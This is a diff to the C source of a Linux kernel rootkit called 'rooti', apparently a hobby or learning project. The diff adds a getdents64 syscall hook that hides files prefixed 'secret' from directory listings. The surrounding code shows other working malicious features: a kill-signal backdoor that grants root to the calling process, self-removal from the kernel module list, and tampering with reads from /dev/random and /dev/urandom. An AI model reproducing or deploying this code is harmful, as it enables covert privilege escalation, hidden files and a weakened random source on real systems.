@@ -5,12 +5,16 @@
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/uaccess.h>
+#include <linux/dirent.h>
 #include "hooking.c"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
+
+// Prefix of files that we wish to hide
+#define ROOTI_HIDE_PREFIX "secret"
 
 // Unused signal numbers can, be used by the rootkit for its own purposes
 enum rooti_signals {
@@ -39,12 +43,17 @@ static LIST_HEAD(rooti_random_tamper_fds);
 static bool rooti_hidden = false;
 static struct list_head *rooti_prev_module = NULL;
 
+// References to the original syscall handlers which we are hooking
 static asmlinkage long (*rooti_orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_openat)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_close)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_read)(const struct pt_regs *regs);
+static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
 
+/*
+    Escalates the privilege of the current process in execution to root user & group.
+*/
 static int rooti_elevate_privilege(void)
 {
     // Prepare new set of credentials
@@ -66,13 +75,21 @@ static int rooti_elevate_privilege(void)
     return 0;
 }
 
-static void rooti_hideme(void) {
+/*
+    Hides this rootkit by removing it from the kernel modules list.
+*/
+static void rooti_hideme(void)
+{
     rooti_hidden = true;
     rooti_prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 }
 
-static void rooti_showme(void) {
+/*
+    Reveals this rootkit by re-adding it to the kernel modules list.
+*/
+static void rooti_showme(void)
+{
     rooti_hidden = false;
     list_add(&THIS_MODULE->list, rooti_prev_module);
     rooti_prev_module = NULL;
@@ -82,6 +99,7 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
     if (sig == ROOTI_SIG_HIDE) {
+        // Toggle hidden state
         if (rooti_hidden) {
             rooti_showme();
         } else {
@@ -90,6 +108,7 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
         return 0;
     }
     else if (sig == ROOTI_SIG_PE) {
+        // Privilege escalation to root
         return rooti_elevate_privilege();
     }
     return rooti_orig_kill(regs);
@@ -98,6 +117,7 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 
 static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
 {
+    // Allocate a kernel buffer for the filename
     struct rooti_tamper_fd *tamper_fd = NULL;
     char *filepath_user = (char *)regs->si;
     char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
@@ -106,6 +126,7 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
         return rooti_orig_openat(regs);
     }
 
+    // Copy the requested filename to the kernel mode buffer
     int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
     if (err > 0) {
         printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
@@ -113,6 +134,7 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
         return rooti_orig_openat(regs);
     }
     
+    // Check if the requested file to open is one of the two Linux char devices providing random bytes
     if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
         pid_t pid = current->pid;
         int fd = rooti_orig_openat(regs);
@@ -143,6 +165,7 @@ static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
     pid_t pid = current->pid;
     int fd = regs->di;
 
+    // If present, remove the open FD from the list of tampared FDs
     struct rooti_tamper_fd *record, *tmp;
     list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
         if (pid == record->pid && fd == record->fd) {
@@ -153,11 +176,13 @@ static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
     return rooti_orig_close(regs);
 }
 
-static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs) {
+static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
+{
     pid_t pid = current->pid;
     int oldfd = regs->di;
     int newfd = rooti_orig_dup2(regs);
 
+    // If present, update the FD of the tampered file. TODO: add instead of delete
     struct rooti_tamper_fd *record;
     list_for_each_entry(record, &rooti_random_tamper_fds, head) {
         if (pid == record->pid && oldfd == record->fd) {
@@ -168,7 +193,8 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs) {
     return newfd;
 }
 
-static asmlinkage long rooti_hook_read(const struct pt_regs *regs) {
+static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
+{
     pid_t pid = current->pid;
     int fd = regs->di;
     char *user_buf = (char *)regs->si;
@@ -197,13 +223,76 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs) {
     return nread;
 }
 
+static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
+{
+    // Invoke the original syscall
+    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
+    int nread = rooti_orig_getdents64(regs);
+    if (nread < 0) {
+        return nread;
+    }
+
+    // Allocate a kernel buffer to store the data returned to user
+    struct linux_dirent64 *kernel_buf = kmalloc(nread, GFP_KERNEL);
+    if (kernel_buf == NULL) {
+        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        return nread;
+    }
+
+    // Copy the return data of the syscall to our kernel buffer
+    int err = copy_from_user(kernel_buf, user_buf, nread);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        kfree(kernel_buf);
+        return nread;
+    }
+
+    // Tamper with the returned records, concealing any files we wish to hide 
+    struct linux_dirent64 *curr_record = NULL;
+    struct linux_dirent64 *prev_record = NULL;
+    unsigned long offset = 0;
+    unsigned short prefix_length = strlen(ROOTI_HIDE_PREFIX);
+    while (offset < nread) {
+        curr_record = (void *)kernel_buf + offset;
+        // Check if the current file begins with the defined prefix
+        if (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0) {
+            // Special case where to to hide is is the first element
+            if (curr_record == kernel_buf) {
+                // Shift the entire buffer to override the current record
+                nread -= curr_record->d_reclen;
+                memmove(curr_record, (void *)curr_record + curr_record->d_reclen, nread);
+                continue;
+            } else {
+                // Increase the size of previous record to override the current record
+                prev_record->d_reclen += curr_record->d_reclen;
+            }
+        } else {
+            prev_record = curr_record;
+        }
+        offset += curr_record->d_reclen;
+    }
+
+    // Copy the rigged buffer back to userspace
+    err = copy_to_user(user_buf, kernel_buf, nread);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+        kfree(kernel_buf);
+        return nread;
+    }
+
+    kfree(kernel_buf);
+    return nread;
+}
+
+
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
     ROOTI_HOOK("sys_kill", rooti_hook_kill, &rooti_orig_kill),
     ROOTI_HOOK("sys_openat", rooti_hook_openat, &rooti_orig_openat),
     ROOTI_HOOK("sys_close", rooti_hook_close, &rooti_orig_close),
     ROOTI_HOOK("sys_dup2", rooti_hook_dup2, &rooti_orig_dup2),
-    ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read)
+    ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read),
+    ROOTI_HOOK("sys_getdents64", rooti_hook_getdents64, &rooti_orig_getdents64)
 };
 
 
